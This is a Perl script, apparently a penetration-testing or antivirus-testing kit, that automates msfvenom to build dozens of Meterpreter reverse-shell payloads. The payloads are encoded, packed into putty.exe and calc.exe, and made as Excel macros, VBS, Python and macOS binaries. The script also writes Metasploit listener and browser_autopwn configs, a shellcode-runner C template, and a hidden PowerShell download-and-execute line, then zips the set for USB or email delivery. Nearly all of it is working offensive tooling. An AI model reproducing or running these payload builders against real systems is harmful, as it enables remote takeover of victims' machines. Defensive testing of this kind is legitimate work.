#!/usr/bin/perl
use strict;
use warnings;

  my($LHOST, $LPORT, $PROJECT, $PROJECTNUM);
  my($fileNdx,  $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);
  my($archiveFolder);
  my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);
  my($scriptNum,$scriptName);

  $LHOST = shift or die "Expecting an IP address in arg 1";  
  $LPORT = shift or die "Expecting a TCP Port address in arg 2";  
  $PROJECT = shift or die "Expecting a Project Name in arg 3"; 
  $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";
 
  #define the target folder and ensure it exists
  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;
 
  $fileNdx=0;
  $commandControl = "lhost=$LHOST lport=$LPORT";

  #archive the old version
  ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
  $archiveFolder="/opt/malwaredefense/archive" . (${year} + 1900) . sprintf("%02d",(${mon}+1)) . sprintf("%02d",${mday});
  $archiveFolder.= "_" . sprintf("%02d",${hour}). sprintf("%02d",${min}). sprintf("%02d",${sec});
  `mkdir -p $archiveFolder`;
  `mv $targetFolder/* $archiveFolder/`;

  ###################
  ##
  ##  32 bit Staged Delivery
  ##
  ##################

  `touch $targetFolder/000-StartMSF900.cue`;
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $encoder = "-e generic/none";


  open( $OUTFILE, '>', "$targetFolder/900-reverse_tcp_noenc-32.rc");
print $OUTFILE <<TCPNOENC;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC
  close $OUTFILE;

  $scriptNum ="001";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.exe"; 
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter: $cmd";
  `$cmd`;

  $scriptNum ="002";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter packed into putty: $cmd \n";
  `$cmd`;
  
  $scriptNum ="003";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vbs  (Download and pass as arg to cscript or double click): $cmd \n";
  `$cmd`;

  $scriptNum ="004";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="005";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");




  ###################
  ##
  ##  32 bit Staged Delivery + Encoding
  ##
  ##################
  
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  
  #continue to use previous listener

  $scriptNum ="011";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded: $cmd";
  `$cmd`;

  $scriptNum ="012";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded, packed into putty: $cmd \n";
  `$cmd`;

  $scriptNum ="013";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter  encoded vbs(Download and pass as arg to cscript or double click): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $scriptNum ="014";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.vba";
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="015";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(360,"$targetFolder/$scriptName");

  `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;

 open( $OUTFILE, '>', "$targetFolder/905-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPENC;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC
  close $OUTFILE;

  ###################
  ##
  ##  32 bit Stageless Delivery
  ##
  ##################

  `touch $targetFolder/060-StartMSF980.cue`;
  $payload = "windows/meterpreter_reverse_tcp";
  $encoder = "";
  $platform_arch = '--platform win -ax86';

  open( $OUTFILE, '>', "$targetFolder/980-stageless-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPSTAGELESS32;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS32
  close $OUTFILE;

  $scriptNum ="061";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, no encoding: $cmd\n";
  `$cmd`;

  $scriptNum ="062";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;

  $scriptNum ="063";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StaglessMeterpreter-32.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $scriptNum ="064";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bbit Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="065";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(957999,"$targetFolder/$scriptName");

  ###################
  ##
  ##  32 bit Stageless Delivery + Encoding
  ##
  ##################
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter_reverse_tcp';

  #continue using previous listener
  
  $scriptNum ="071";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, encoded: $cmd";
  `$cmd`;

  $scriptNum ="072";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter packed into putty, encoded: $cmd \n";
  `$cmd`;

  $scriptNum ="073";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $scriptNum ="074";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vba";
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="075";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32enc.c";
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");


  ###################
  ##
  ##  64bit Staged Delivery 
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter/reverse_tcp';
  $encoder = ''; 
  
  `touch $targetFolder/100-StartMSF910.cue`;


  open( $OUTFILE, '>', "$targetFolder/910-reverse_tcp-noenc-64.rc");
print $OUTFILE <<TCPNOENC64;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC64
  close $OUTFILE;
 
  $scriptNum ="101";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter, no encoding: $cmd";
  `$cmd`;
  
  $scriptNum ="102";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;

  $scriptNum ="103";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $scriptNum ="104";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="105";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(510,"$targetFolder/$scriptName");


  ###################
  ##
  ##  64bit Staged Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter/reverse_tcp';

  #Continue using previous listener

  $scriptNum ="111";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter, encoded: $cmd";
  `$cmd`;

  $scriptNum ="112";
  $scriptName="112-${PROJECT}-${PROJECTNUM}-StagedPackedMeterpreter-calc-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter packed into putty, encoded: $cmd \n";
  `$cmd`;

  $scriptNum ="113";
  $scriptName="113-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter vbs,encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $scriptNum ="114";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit staged Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="115";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-64enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(631,"$targetFolder/$scriptName");

  `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;


  open( $OUTFILE, '>', "$targetFolder/915-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPENC64;
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC64
  close $OUTFILE;



  ###################
  ##
  ##  64bit Stageless Delivery
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter_reverse_tcp';
  $encoder = '';

  `touch $targetFolder/160-StartMSF990.cue`;

  open( $OUTFILE, '>', "$targetFolder/990-stageless-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPSTAGELESS64;
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS64
  close $OUTFILE;

  $scriptNum ="161";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, no encoding: $cmd";
  `$cmd`;

  $scriptNum ="162";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;

  $scriptNum ="163";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $scriptNum ="164";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Bit Stageless Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="165";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(1189423,"$targetFolder/$scriptName");


  ###################
  ##
  ##  64bit Stageless Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter_reverse_tcp';

  #Continue using previous listener

  $scriptNum ="171";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, encoded: $cmd";
  `$cmd`;

  $scriptNum ="172";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-PackedStagelessMeterpreter-calc-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into win calc, encoded: $cmd \n";
  `$cmd`;

  $scriptNum ="173";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $scriptNum ="174";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $scriptNum ="175";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter  C Shell Code: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(1189543,"$targetFolder/$scriptName");

  $payload = 'windows/x64/meterpreter/reverse_tcp';


  ###################
  ##
  ##  Powershell HTTPS
  ##
  ##################

  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
  open( $OUTFILE, '>', "$targetFolder/950-reversehttps.rc");
print $OUTFILE <<RHTTPSNOENC;
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
RHTTPSNOENC
  close $OUTFILE;


  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  my ($ShellCodePath) ="./inc/Invoke-Shellcode.ps1";
  $scriptName = "202-Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/$scriptName`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/$scriptName`;
  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/$scriptName'))";
  $scriptname = "201_PScommand.txt";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;



  ###################
  ##
  ##  Browser Autopwn
  ##
  ##################


  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run960.cue`;

  open( $OUTFILE, '>', "$targetFolder/960-browserautopwn1.rc");
print $OUTFILE <<BAPENC;
use auxiliary/server/browser_autopwn
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC
  close $OUTFILE;






  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
  open( $OUTFILE, '>', "$targetFolder/965-browserautopwn2.rc");
print $OUTFILE <<BAPENC2;
use auxiliary/server/browser_autopwn2
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC2


  ###################
  ##
  ##  Python
  ##
  ##################
 

  $platform_arch = "--platform Python -a python";
  $encoder = "-e generic/none";
  $payload = "python/meterpreter/reverse_tcp";

 `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
  open( $OUTFILE, '>', "$targetFolder/970-pythonreverse_tcp.rc");
print $OUTFILE <<PYRTCP;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
PYRTCP
  close $OUTFILE;



  $scriptNum ="401";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Meterpreter python: $cmd\n";
  `$cmd`;



  ###################
  ##
  ##  MAC
  ##
  ##################


  $platform_arch = "--platform OSX -a x86";
  $encoder = '-e generic/none -b "\x00"';
  $payload = "osx/x86/shell_reverse_tcp";

 `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
  open( $OUTFILE, '>', "$targetFolder/975-MacShellReverseTCP.rc");
print $OUTFILE <<MACSHELL1;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
MACSHELL1
  close $OUTFILE;

  $scriptNum ="501";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell.macho";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Meterpreter mac: $cmd\n";
  `$cmd`;

  ###################
  ##
  ##  exe masking
  ##
  ##################

  my($originalFile,$maskedFile);
  opendir (DIR, $targetFolder) or die $!;
  while (my $originalFile = readdir(DIR)) {
    $_ = $originalFile;
    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/){next;}
    $maskedFile = $originalFile;
    $maskedFile =~ s/.$/_/;
    `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
  }
  closedir(DIR);

  ###################
  ##
  ## Other Attacks 
  ##
  ##################

 `touch $targetFolder/600-${PROJECT}-${PROJECTNUM}-AlternateBoot.cue`;
 `touch $targetFolder/601-${PROJECT}-${PROJECTNUM}-USB.cue`;
 `touch $targetFolder/602-${PROJECT}-${PROJECTNUM}-Email.cue`;

  ###################
  ##
  ##  zip it up for USB/Download fast transfer
  ##
  ##################

  `cp /opt/eicar/eicar.com /opt/malwaredefense/current/0001-eicar.com`;
  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0002-eicar.com.txt`;
  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0003-eicar.com.jpg`;
  `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
  `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;
  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e `;






sub createShellcodeEXEFromTemplate{
  my($venomFile, $VENOM, $codeSize, $outCFile, $outEXEFile, $OUTPUT);
  $codeSize = shift;
  $venomFile = shift;
  $outEXEFile = $venomFile;
  $outEXEFile =~ s/c$/exe/;
  $outCFile = $venomFile;
  $outCFile =~ s/\.c$/-CustTemplate.c/;
  open($OUTPUT, ">",$outCFile);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_START;
#include <stdio.h>
#include <windows.h> //VirtualAlloc is defined here
//YOU MUST REPLACE the buf and the size 
SHELL_CODE_TEMPLATE_START
  open($VENOM, "<",$venomFile);
  print $OUTPUT "size_t size = $codeSize; //size of buf in bytes (output by msfvenom)\n\n";
  while(<$VENOM>){
    print $OUTPUT $_;
  }
  close($VENOM);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_END;
int main(int argc, char **argv) {
char *code;                     //Holds a memory address
code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
        NULL, size, MEM_COMMIT,     
        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
    );
memcpy(code, buf, size);    //Copy our spud into the executable section of memory
((void(*)())code)();            //Cast the executable memory to a function pointer and run it
return(0);
}
SHELL_CODE_TEMPLATE_END
  close($OUTPUT);
  $outEXEFile = $outCFile;
  $outEXEFile =~ s/c$/exe/;
  $_=$outEXEFile;
  if (/64/){
    `x86_64-w64-mingw32-gcc $outCFile -o $outEXEFile`;
  }else{
    `i686-w64-mingw32-gcc $outCFile  -o $outEXEFile`;
  }
  print "Completed gerneration of $outEXEFile\n";
}






 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom -p ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
